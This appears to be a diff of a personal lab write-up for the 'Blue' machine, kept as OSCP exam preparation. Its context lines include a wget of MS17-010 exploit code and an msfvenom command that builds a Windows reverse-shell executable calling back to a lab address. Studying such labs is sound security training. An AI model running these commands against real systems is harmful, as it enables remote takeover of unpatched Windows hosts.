@@ -1,10 +1,10 @@
-
+# Blue
 Name: Blue
 Date:  
-Difficulty:  
+Difficulty:  Easy
 Description:  
 Better Description:  
-Goals:  
+Goals:  OSCP Prep, rewrite a python exploit
 Learnt:
 
 ## Recon
@@ -43,7 +43,6 @@ wget https://raw.githubusercontent.com/worawit/MS17-010/master/mysmb.py
 ```bash
 # reverse_tcp for the OSCP guidelines
 msfvenom -p windows/shell_reverse_tcp LHOST=10.129.105.18 LPORT=4444 -f exe -o shell.exe
-
 ```
 
 ## Foothold
